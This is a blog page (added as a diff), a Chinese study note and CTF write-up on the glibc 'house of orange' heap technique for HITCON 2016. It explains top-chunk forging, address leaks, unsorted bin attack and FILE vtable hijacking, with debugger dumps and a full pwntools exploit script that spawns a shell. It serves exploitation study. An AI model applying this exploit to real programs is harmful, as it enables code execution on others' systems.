@@ -1,0 +1,569 @@
+
+ <!DOCTYPE HTML>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  
+    <title>house of_系列学习之 house of orange | p1Kk&#39;s World!</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="p1Kk">
+    
+
+    
+    <meta name="description" content="emmm说起来这也算是house of orange这道题的wp了ovo house of orange利用环境题目不存在free函数或无法利用free（其他）释放堆块的函数 原理House of Orange核心就是通过漏洞利用获得free效果（即：没有free的情况下得到一个释放的堆块（unsorted bin））。  如何在没有free的情况下得到unsorted bin？当前堆的top c">
+<meta name="keywords" content="pwn,堆,笔记">
+<meta property="og:type" content="article">
+<meta property="og:title" content="house of_系列学习之 house of orange">
+<meta property="og:url" content="p1Kk.github.io/2019/11/17/house of/house of_系列学习/index.html">
+<meta property="og:site_name" content="p1Kk&#39;s World!">
+<meta property="og:description" content="emmm说起来这也算是house of orange这道题的wp了ovo house of orange利用环境题目不存在free函数或无法利用free（其他）释放堆块的函数 原理House of Orange核心就是通过漏洞利用获得free效果（即：没有free的情况下得到一个释放的堆块（unsorted bin））。  如何在没有free的情况下得到unsorted bin？当前堆的top c">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/2019-10-21-16-09-51.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/gg.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/27/cztFi6K1RJmxY2N.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/27/Gjimrbx2FUAwEsR.png">
+<meta property="og:updated_time" content="2020-04-07T13:51:07.095Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="house of_系列学习之 house of orange">
+<meta name="twitter:description" content="emmm说起来这也算是house of orange这道题的wp了ovo house of orange利用环境题目不存在free函数或无法利用free（其他）释放堆块的函数 原理House of Orange核心就是通过漏洞利用获得free效果（即：没有free的情况下得到一个释放的堆块（unsorted bin））。  如何在没有free的情况下得到unsorted bin？当前堆的top c">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/2019-10-21-16-09-51.png">
+
+    
+    <link rel="alternative" href="atom.xml" title="p1Kk&#39;s World!" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/site.jpg">
+    
+    
+    <link rel="apple-touch-icon" href="/img/head.png">
+    <link rel="apple-touch-icon-precomposed" href="/img/head.png">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo2.jpg" alt="p1Kk&#39;s World!" title="p1Kk&#39;s World!"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="p1Kk&#39;s World!">p1Kk&#39;s World!</a></h1>
+				<h2 class="blog-motto">艺无止境，功不唐捐。</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+						<li><a href="/tags">Tags</a></li>
+					
+						<li><a href="/categories">Categories</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="hidden" name="q" value="site:p1Kk.github.io">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+	
+	  <article itemprop="articleBody"> 
+		  <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2019/11/17/house of/house of_系列学习/" title="house of_系列学习之 house of orange" itemprop="url">house of_系列学习之 house of orange</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="p1Kk" target="_blank" itemprop="author">p1Kk</a>
+		
+  <p class="article-time">
+    <time datetime="2019-11-16T16:00:00.000Z" itemprop="datePublished"> Published 2019-11-17</time>
+    
+  </p>
+</header>
+	  <div class="article-content">
+		  
+		  <div id="toc" class="toc-article">
+			  <strong class="toc-title">Contents</strong>
+		  
+			  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-orange"><span class="toc-number">1.</span> <span class="toc-text">house of orange</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#利用环境"><span class="toc-number">1.1.</span> <span class="toc-text">利用环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#原理"><span class="toc-number">1.2.</span> <span class="toc-text">原理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#例题：HITCON2016-house-of-orange"><span class="toc-number">2.</span> <span class="toc-text">例题：HITCON2016_house-of-orange</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#libc2-23及以前"><span class="toc-number">2.1.</span> <span class="toc-text">libc2.23及以前</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析"><span class="toc-number">2.1.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#思路"><span class="toc-number">2.1.2.</span> <span class="toc-text">思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#File-Stream-Oriented-Porgramming"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">File Stream Oriented Porgramming</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">2.2.</span> <span class="toc-text"></span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">2.2.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#我无语了，今天一下脚本根本没有上传上去，全没了，只能先贴上官方的了"><span class="toc-number">2.3.</span> <span class="toc-text">我无语了，今天一下脚本根本没有上传上去，全没了，只能先贴上官方的了</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#libc2-24"><span class="toc-number">2.4.</span> <span class="toc-text">libc2.24</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#思路-1"><span class="toc-number">2.4.1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-1"><span class="toc-number">2.4.2.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li></ol>
+		  
+		  </div>
+		  
+		  <p>emmm说起来这也算是house of orange这道题的wp了ovo</p>
+<h1 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h1><h2 id="利用环境"><a href="#利用环境" class="headerlink" title="利用环境"></a>利用环境</h2><p>题目不存在free函数或无法利用free（其他）释放堆块的函数</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>House of Orange核心就是通过漏洞利用获得free效果（即：没有free的情况下得到一个释放的堆块（unsorted bin））。</p>
+<ul>
+<li>如何在没有free的情况下得到unsorted bin？<br>当前堆的top chunk尺寸不足以满足申请分配的大小的时候，原来的top chunk会被释放并被置入unsorted bin中，通过这一点可以在没有free函数情况下获取到unsorted bins。<br>所以首先我们在<code>_int_malloc</code>函数中，依次检验fastbin、small bins、unsorted bin、large bins 是否满足分配要求，如果不符合，接下来就会试图使用top chunk，如果top chunk也不能满足分配的要求。<br>说明<code>ptmalloc</code>已经不能满足用户申请堆内存的操作，需要执行<code>sysmalloc</code>来向系统申请更多的空间。<br>但是堆有<code>mmap</code>和<code>brk</code>两种分配方式，我们需要让堆以<code>brk</code>的形式拓展，之后原有的top chunk就会被置于unsorted bin中。</li>
+<li>如何实现<code>brk</code>拓展top chunk？<br>（需要绕过一些libc的check）：所需分配的chunk的大小要[<strong>mp_.mmap_threshold</strong>(128K), <strong>mp_.n_mmaps_max</strong>)【查了一下这个一次能申请的最大的内存空间，一般malloc申请的达不到，所以对于CTFpwn可以不考虑】<br>在<code>sysmalloc</code>函数中会检查top chunk size的合法性，要求：</li>
+</ul>
+<p>1.如果第一次调用，top chunk的old_size可能为0。<br>2.如果已经初始化，由于top chunk中含有fencepost，所以top chunk必须 &gt; MINSIZE。<br>3.top chunk必须标识前一个chunk处于inuse状态<br>4.top chunk的结束地址必定是页对齐的。<br>5.top chunk除去foncepost的大小必定要小于所需chunk的大小</p>
+<ul>
+<li>如何将伪造的size对齐到内存页？<br>一般内存页的大小是4kb，那么我们伪造的size就必须对齐到这个尺寸。<br>eg：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000020fe1 &lt;== top chunk</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>计算：0x602020+0x20fe0=0x623000 是对于0x1000（4kb）对齐的。所以我们伪造的fake_size可以是0x0fe1、0x1fe1、0x2fe1、0x3fe1 等对 4kb 对齐的 size。</p>
+<p>综上，伪造top chunk size的要求为：</p>
+<ol>
+<li>伪造的 size 必须要对齐到内存页</li>
+<li>size 要大于 MINSIZE(0x10)</li>
+<li>size 要小于之后申请的 chunk size + MINSIZE(0x10)</li>
+<li>size 的 prev inuse 位必须为 1</li>
+</ol>
+<p>之后原有的 top chunk 就会执行<code>_int_free</code>从而顺利进入 unsorted bin 中。接下来的分配，如果size符合要求就会切割这个放入unsorted bin中的top chunk块。</p>
+<p>众所周知，<code>实践出真知</code>。d=====(￣▽￣*)b</p>
+<h1 id="例题：HITCON2016-house-of-orange"><a href="#例题：HITCON2016-house-of-orange" class="headerlink" title="例题：HITCON2016_house-of-orange"></a>例题：HITCON2016_house-of-orange</h1><h2 id="libc2-23及以前"><a href="#libc2-23及以前" class="headerlink" title="libc2.23及以前"></a>libc2.23及以前</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><strong>checksec</strong></p>
+<p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/2019-10-21-16-09-51.png" alt="保护全开"></p>
+<p><strong>ida</strong><br>程序没有free函数，【也是在这道题中提出了house of orange利用方法】<br>upgrade函数中，可以重新定义name的大小，但是name的内存空间是在build的时候申请的，所以此处存在堆溢出。<br><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/gg.png" alt></p>
+<p>顾名思义啦，就是用<strong>house of orange</strong>来做</p>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>1.利用堆溢出修改top chunk的size（小于之后申请的size + 0x10）<br>2.调用<code>sysmalloc</code>执行<code>free</code>，使top chunk被free进入unsorted bin中。<br>3.申请large bin（因为malloc一个<strong>large bin</strong> ( &gt;512B ))会将chunk自身的地址写到chunk的fd_nextsize和bk_nextsize）,写入0x8泄露fd，写入0x10泄露fd_nextsize ==&gt; 泄露libc和heap地址<br>4.利用<a href="https://p1kk.github.io/2019/10/23/unsorted%20bin%20attack/unsorted%20bin%20attack/" target="_blank" rel="noopener">unsorted bin attack</a>实现任意地址写 ==&gt; 改<code>_IO_list_all</code>到<code>main_arena</code>中top的位置【关于这点，可以<a href="https://p1kk.github.io/2019/10/21/IO/FILE%20structure%20used%20with%20%E2%80%9Cstream%20functions%E2%80%9D/" target="_blank" rel="noopener">在IO这篇笔记中查找_IO_list_all</a>】<br>5.调用<code>system(&quot;/bin/sh&quot;)</code></p>
+<h4 id="File-Stream-Oriented-Porgramming"><a href="#File-Stream-Oriented-Porgramming" class="headerlink" title="File Stream Oriented Porgramming"></a>File Stream Oriented Porgramming</h4><p>rop即<code>Retn Oriented Programming</code><br>FSOP即<code>File stream Oriented Programming</code><br>这两种都是劫持程序流程的方法，只不过FSOP是通过攻击File Stream来实现<br>(以下【关于f函数调用的vtable函数过程，FSOP】的详情都可以查看<a href="https://p1kk.github.io/2019/10/21/FILE%20structure%20used%20with%20%E2%80%9Cstream%20functions%E2%80%9D/IO/FILE%20structure%20used%20with%20%E2%80%9Cstream%20functions%E2%80%9D/" target="_blank" rel="noopener">IO_FILE structure used with “stream functions”</a>)</p>
+<p><code>vtable</code>劫持的原理是：如果能够控制FILE结构体，实现对<code>vtable</code>指针的修改，使得<code>vtable</code>指向可控的内存，在该内存中构造好<code>vtable</code>，再通过调用相应IO函数，触发<code>vtable</code>函数的调用，即可劫持程序执行流。<br>修改<code>vtable</code>字段的方法：<br>1.只修改内存中已有的FILE结构体的vtable指针<br>2.伪造整个FILE结构体。</p>
+<h2 id><a href="#" class="headerlink" title></a><img src="https://i.loli.net/2019/10/27/cztFi6K1RJmxY2N.png" alt></h2><p>先新建一个chunk_house</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x55fab48b4000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 33, </span><br><span class="line">  fd = 0x55fab48b4070, </span><br><span class="line">  bk = 0x55fab48b4030, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x41</span><br><span class="line">&#125;</span><br><span class="line">0x55fab48b4020 FASTBIN &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 65, </span><br><span class="line">  fd = 0x6161616161616161, ==&gt; name = &apos;a&apos; * 8</span><br><span class="line">  bk = 0xa, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x55fab48b4060 FASTBIN &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 33, </span><br><span class="line">  fd = 0x1f00000001, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x20f81</span><br><span class="line">&#125;</span><br><span class="line">0x55fab48b4080 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 135041, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接下来进行改写top chunk</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x5593d5d73020</span><br><span class="line">0x5593d5d73020:	0x0000000000000000	0x0000000000000041  ==&gt; new name length</span><br><span class="line">0x5593d5d73030:	0x6161616161616161	0x6161616161616161  ==&gt; new name</span><br><span class="line">0x5593d5d73040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5593d5d73050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5593d5d73060:	0x0000000000000000	0x0000000000000021  ==&gt; fd_nextsize &amp;&amp; bk_nextsize</span><br><span class="line">0x5593d5d73070:	0x0000001f00000006	0x6161616161616161  ==&gt; content</span><br><span class="line">0x5593d5d73080:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5593d5d73090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5593d5d730a0:	0x0000000000000000	0x0000000000000f81  ==&gt; 改写top chunk size...我填的明明是0xfa1哇？//所以我这里需要改一下</span><br><span class="line">0x5593d5d730b0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">build(0x30,&apos;a&apos;*8,123,1)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x30 + p64(0) + p64(0x21) +&apos;a&apos;*16+ p64(0)+ p64(0xf80)</span><br><span class="line">upgrade(len(payload),payload,123,2)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/10/27/Gjimrbx2FUAwEsR.png" alt="堆情况"></p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from time import sleep</span><br><span class="line">import sys</span><br><span class="line">context.binary = &quot;./houseoforange&quot;</span><br><span class="line"></span><br><span class="line">elf = ELF(&quot;./houseoforange&quot;)</span><br><span class="line">l = 0</span><br><span class="line">if l:</span><br><span class="line">    io = process(&quot;./houseoforange&quot;)</span><br><span class="line">    libc = elf.libc</span><br><span class="line">    libc.sym[&quot;main_arena&quot;] = 0x3c4b20</span><br><span class="line">else:</span><br><span class="line">    io = process(&quot;./houseoforange&quot;)</span><br><span class="line">    libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">    libc.sym[&quot;main_arena&quot;] = 0x3c3b20</span><br><span class="line">#  context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">def DEBUG():</span><br><span class="line">    info(&quot;malloc -&gt; &#123;:#x&#125;&quot;.format(0xDA5))</span><br><span class="line">    info(&quot;build ret -&gt; &#123;:#x&#125;&quot;.format(0xEE5))</span><br><span class="line">    info(&quot;printf -&gt; &#123;:#x&#125;&quot;.format(0xF35))</span><br><span class="line">    info(&quot;read_n -&gt; &#123;:#x&#125;&quot;.format(0x1119))</span><br><span class="line">    raw_input(&quot;DEBUG: &quot;)</span><br><span class="line"></span><br><span class="line">def build(length, name):</span><br><span class="line">    io.sendlineafter(&quot;choice : &quot;, &quot;1&quot;)</span><br><span class="line">    sleep(0.01)</span><br><span class="line">    io.sendlineafter(&quot;name :&quot;, str(length))</span><br><span class="line">    sleep(0.01)</span><br><span class="line">    io.sendafter(&quot;Name :&quot;, name)</span><br><span class="line">    sleep(0.01)</span><br><span class="line">    io.sendlineafter(&quot;Orange:&quot;, &quot;1&quot;)</span><br><span class="line">    sleep(0.01)</span><br><span class="line">    io.sendlineafter(&quot;Orange:&quot;, str(0xddaa))</span><br><span class="line">    sleep(0.01)</span><br><span class="line"></span><br><span class="line">def see():</span><br><span class="line">    io.sendlineafter(&quot;choice : &quot;, &quot;2&quot;)</span><br><span class="line">    sleep(0.01)</span><br><span class="line"></span><br><span class="line">def upgrade(length, name):</span><br><span class="line">    io.sendlineafter(&quot;choice : &quot;, &quot;3&quot;)</span><br><span class="line">    sleep(0.01)</span><br><span class="line">    io.sendlineafter(&quot;name :&quot;, str(length))</span><br><span class="line">    sleep(0.01)</span><br><span class="line">    io.sendafter(&quot;Name:&quot;, name)</span><br><span class="line">    sleep(0.01)</span><br><span class="line">    io.sendlineafter(&quot;Orange:&quot;, &quot;1&quot;)</span><br><span class="line">    sleep(0.01)</span><br><span class="line">    io.sendlineafter(&quot;Orange:&quot;, str(0xddaa))</span><br><span class="line">    sleep(0.01)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    build(0x10, &apos;0&apos; * 0x10) # build 1</span><br><span class="line">    # overwrite top_chunk size</span><br><span class="line">    upgrade(0x40, flat(&apos;1&apos; * 0x10, 0, 0x21, 0xddaa00000001, 0, 0, 0xfa1)) # upgrade 1</span><br><span class="line"></span><br><span class="line">    # trigger _int_free</span><br><span class="line">    build(0x1000, &apos;2&apos; * 0x1000) # build 2</span><br><span class="line"></span><br><span class="line">    # large bin</span><br><span class="line">    build(0x400, &apos;33333333&apos;) # build 3</span><br><span class="line">    # leak libc</span><br><span class="line">    see()</span><br><span class="line">    io.recvuntil(&quot;33333333&quot;)</span><br><span class="line">    libc.address = u64(io.recvuntil(&quot;\x7f&quot;)[-6: ] + &apos;\0\0&apos;) - 1640 - libc.sym[&apos;main_arena&apos;]</span><br><span class="line">    success(&quot;libc -&gt; &#123;:#x&#125;&quot;.format(libc.address))</span><br><span class="line">    _IO_list_all = libc.sym[&apos;_IO_list_all&apos;]</span><br><span class="line">    success(&quot;_IO_list_all -&gt; &#123;:#x&#125;&quot;.format(_IO_list_all))</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">    # leak heap</span><br><span class="line">    upgrade(0x10, &apos;4&apos; * 0x10) # upgrade 2</span><br><span class="line">    see()</span><br><span class="line">    io.recvuntil(&apos;4&apos; * 0x10)</span><br><span class="line">    heapbase = u64(io.recvn(6) + &apos;\0\0&apos;) - 0xc0</span><br><span class="line">    success(&quot;heapbase -&gt; &#123;:#x&#125;&quot;.format(heapbase))</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">    fake_file = flat(&quot;/bin/sh\0&quot;, 0x61)</span><br><span class="line">    fake_file += flat(0xdeadbeef, _IO_list_all - 0x10) # unsorted bin -&gt; fd/bk</span><br><span class="line">    fake_file += flat(0, 1) # _IO_write_base; _IO_write_ptr</span><br><span class="line">    fake_file = fake_file.ljust(0xc0, &apos;\0&apos;)</span><br><span class="line">    fake_file += p64(0) # mode &lt;= 0</span><br><span class="line"></span><br><span class="line">    payload = flat(&apos;5&apos; * 0x400, 0, 0x21, 0xddaa00000001, 0)</span><br><span class="line">    payload += fake_file</span><br><span class="line">    payload += flat(0, 0, heapbase + 0x5d0) # 0xc8, 0xd0, vtable</span><br><span class="line">    # forge vtable</span><br><span class="line">    fake_vtable = flat(0, 0, 0, libc.sym[&apos;system&apos;]) # __dummy, __dummy2, __finish, __overflow</span><br><span class="line">    payload += fake_vtable</span><br><span class="line"></span><br><span class="line">    upgrade(0x800, payload)</span><br><span class="line">    sleep(0.01)</span><br><span class="line"></span><br><span class="line">    #  DEBUG()</span><br><span class="line">    io.sendlineafter(&quot;choice : &quot;, &quot;1&quot;)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>我的脚本有问题…但是没有得到解决。recvuntil的字符串却在下一次recv接收，不知道问题出现在哪里…<br>10.30更<br>得到了解决，感谢梦哥带我一步步调试，<strong>sendline多发送一个’\n’，所以我build的时候申请的空间应该大一些，不能直接用len()，还有recv字符串的时候空格问题下次要仔细</strong>，再次感谢梦哥的帮助。</p>
+<p>下面的libc2.24后面继续…</p>
+<h2 id="我无语了，今天一下脚本根本没有上传上去，全没了，只能先贴上官方的了"><a href="#我无语了，今天一下脚本根本没有上传上去，全没了，只能先贴上官方的了" class="headerlink" title="我无语了，今天一下脚本根本没有上传上去，全没了，只能先贴上官方的了"></a>我无语了，今天一下脚本根本没有上传上去，全没了，只能先贴上官方的了</h2><h2 id="libc2-24"><a href="#libc2-24" class="headerlink" title="libc2.24"></a>libc2.24</h2><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><blockquote>
+<p>以上参考<br><a href="https://ctf-wiki.github.io/ctf-wiki" target="_blank" rel="noopener">CTF-wiki</a><br><a href="https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">IO FILE学习笔记—veritas501</a><br><a href="https://www.jianshu.com/p/1e45b785efc1" target="_blank" rel="noopener">zs0zrc house_of_orange</a><br><a href="https://bbs.pediy.com/thread-222718.htm" target="_blank" rel="noopener">看雪 堆溢出-house of orange</a><br><a href="https://xz.aliyun.com/t/5508" target="_blank" rel="noopener">IO FILE 之劫持vtable及FSOP</a><br><a href="https://www.anquanke.com/post/id/84965" target="_blank" rel="noopener">【CTF攻略】CTF Pwn之创造奇迹的Top Chunk</a></p>
+</blockquote>
+  
+	  </div>
+		  <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/笔记/">笔记</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/pwn/">pwn</a><a href="/tags/堆/">堆</a><a href="/tags/笔记/">笔记</a>
+  </div>
+
+</div>
+
+
+
+</footer>
+
+   	       
+	  </article>
+	  
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2019/11/24/C++学习笔记/C++笔记/" title="C++ 学习笔记">
+  <span>
+  C++ 学习笔记</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2019/11/15/house of/house of roman/"  title="house of_系列学习之 house of roman">
+ <span>house of_系列学习之 house of roman
+</span>
+</a>
+</div>
+
+</nav>
+
+	  
+
+</div> 
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+<div id="authorInfo">
+	
+		<div class="author-img"></div>		
+	
+	<div class="social-info" class="clearfix">
+		
+		<a href="http://weibo.com/https://weibo.com/u/5213203661?refer_flag=0000015010_&amp;from=feed&amp;loc=nickname" target="_blank" class="icon-weibo" title="微博"></a>
+		
+		
+		<a href="https://github.com/p1Kk" target="_blank" class="icon-github" title="github"></a>
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		<a href="mailto:p1kk_wang@qq.com" target="_blank" class="icon-email" title="Email Me"></a>
+		
+
+	</div>
+</div>
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/ACM/" title="ACM">ACM<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/CTF/" title="CTF">CTF<sup>4</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/oj/" title="oj">oj<sup>20</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/漏洞复现/" title="漏洞复现">漏洞复现<sup>10</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/笔记/" title="笔记">笔记<sup>23</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			
